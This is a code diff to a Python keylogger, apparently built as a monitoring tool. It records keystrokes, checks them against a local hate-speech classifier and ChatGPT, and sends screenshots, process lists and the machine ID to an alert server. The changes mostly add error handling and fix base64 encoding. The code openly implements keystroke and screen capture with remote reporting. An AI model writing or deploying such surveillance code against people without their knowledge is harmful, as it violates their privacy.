@@ -17,8 +17,6 @@ import pyshark
 
 PATH_OF_THE_LOGS = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
 
-alert_json = {}
-
 
 def logging(text):
     print(text)
@@ -30,14 +28,17 @@ def logging(text):
 def is_hate_speech(self):
     dataLogs = json.dumps({"value": 0, "frase": self.log})
     header = {'Content-type': 'application/json'}
-    hateSpeech = requests.post("http://127.0.0.1:5000/predict", data=dataLogs, headers=header)
+    try:
+        hateSpeech = requests.post("http://127.0.0.1:5000/predict", data=dataLogs, headers=header)
 
-    hateSpeechJson = json.loads(hateSpeech.content)
-    alert_json = hateSpeechJson[0]
-    if hateSpeechJson[0]['value'] == 1:
-        logging("Geração de alerta por discurso de ódio: " + self.log)
-        logging(str(hateSpeechJson))
-        return True
+        hateSpeechJson = json.loads(hateSpeech.content)
+        alert_json = hateSpeechJson
+        if hateSpeechJson['value'] == 1:
+            logging("Geração de alerta por discurso de ódio: " + self.log)
+            logging(str(hateSpeechJson))
+            return alert_json
+    except:
+        logging("Error to comunicate with spyware API Gateway")
 
     return False
 
@@ -105,9 +106,11 @@ def get_image():
     image = ImageGrab.grab()
     image.save(buffer, format='png')
     image.close()
-    b64_str = base64.b64encode(buffer.getvalue())
+    b64_bytes = base64.b64encode(buffer.getvalue())
 
-    return str(b64_str)
+    b64_str = b64_bytes.decode('utf-8')
+
+    return b64_str
 
 
 def do_login():
@@ -143,11 +146,11 @@ def do_login():
     }
 
 
-def send_alert(log):
+def send_alert(log, alert_json):
     headers = do_login()
 
     try:
-        data_alert = json.dumps({"pcId": str(gma()), "image": get_image(), "processos": get_process(), "models": alert_json['model'], "language": alert_json['language']},
+        data_alert = json.dumps({"log": log, "pcId": str(gma()), "image": get_image(), "processos": get_process(), "models": alert_json['models'], "language": alert_json['language']},
                                sort_keys=True, indent=4)
         alert = requests.post("http://localhost:9000/alert", data_alert, headers=headers)
 
@@ -254,9 +257,10 @@ class Keylogger:
         }
 
     def report(self):
-        if self.log and (is_hate_speech(self) or is_bad_language(self) or are_malicious_process(self) or verifyng_hate_speech_chatGPT(self.log)):
+        alert_json = is_hate_speech(self)
+        if self.log and (alert_json or is_bad_language(self) or are_malicious_process(self) or verifyng_hate_speech_chatGPT(self.log)):
             logging("Foi enviado o report!")
-            send_alert(self.log)
+            send_alert(self.log, alert_json)
         self.log = ""
 
     def start(self):
@@ -313,25 +317,41 @@ def update_aux_data():
     headers = do_login()
     logging("Iniciou a atualização dos dados auxiliars!")
     try:
-        badLanguages = requests.get("http://localhost:9000/language?page=1&size=1000&sortBy=id", headers=headers).json()
-        with open(r"C:\keyLogger\badLanguage.txt", "w") as file:
-            for badLanguage in badLanguages:
-                file.write(badLanguage.get('word') + ";")
+        badLanguageResponse = requests.get("http://localhost:9000/language?page=1&size=1000&sortBy=id", headers=headers)
+        if badLanguageResponse.status_code == 204:
+            logging("There's no badLanguage")
+        else:
+            badLanguages = badLanguageResponse.json()
+            with open(r"C:\keyLogger\badLanguage.txt", "w") as file:
+                for badLanguage in badLanguages:
+                    file.write(badLanguage.get('word') + ";")
 
-        ports = requests.get("http://localhost:9000/port?page=1&size=1000&sortBy=id", headers=headers).json()
-        with open(r"C:\keyLogger\vulnarable_banners.txt", "w") as file:
-            for port in ports:
-                file.write(port.get('vulnarableBanners') + ";")
+        portsResponse = requests.get("http://localhost:9000/port?page=1&size=1000&sortBy=id", headers=headers)
+        if portsResponse.status_code == 204:
+            logging("There's no ports")
+        else:
+            ports = portsResponse.json()
+            with open(r"C:\keyLogger\vulnarable_banners.txt", "w") as file:
+                for port in ports:
+                    file.write(port.get('vulnarableBanners') + ";")
 
-        processes = requests.get("http://localhost:9000/process?page=1&size=1000&sortBy=id", headers=headers).json()
-        with open(r"C:\keyLogger\maliciousProcess.txt", "w") as file:
-            for process in processes:
-                file.write(process.get('nameExe') + ";")
+        processesResponse = requests.get("http://localhost:9000/process?page=1&size=1000&sortBy=id", headers=headers)
+        if processesResponse.status_code == 204:
+            logging("There's no processes")
+        else:
+            processes = processesResponse.json()
+            with open(r"C:\keyLogger\maliciousProcess.txt", "w") as file:
+                for process in processes:
+                    file.write(process.get('nameExe') + ";")
 
-        websites = requests.get("http://localhost:9000/website?page=1&size=1000&sortBy=id", headers=headers).json()
-        with open(r"C:\keyLogger\sites.txt", "w") as file:
-            for website in websites:
-                file.write(website.get('url') + ";")
+        websitesResponse = requests.get("http://localhost:9000/website?page=1&size=1000&sortBy=id", headers=headers)
+        if websitesResponse.status_code == 204:
+            logging("There's no websites")
+        else:
+            websites = websitesResponse.json()
+            with open(r"C:\keyLogger\sites.txt", "w") as file:
+                for website in websites:
+                    file.write(website.get('url') + ";")
     except Exception as ex:
         logging("Error to update the auxiliar data." + str(ex))
 
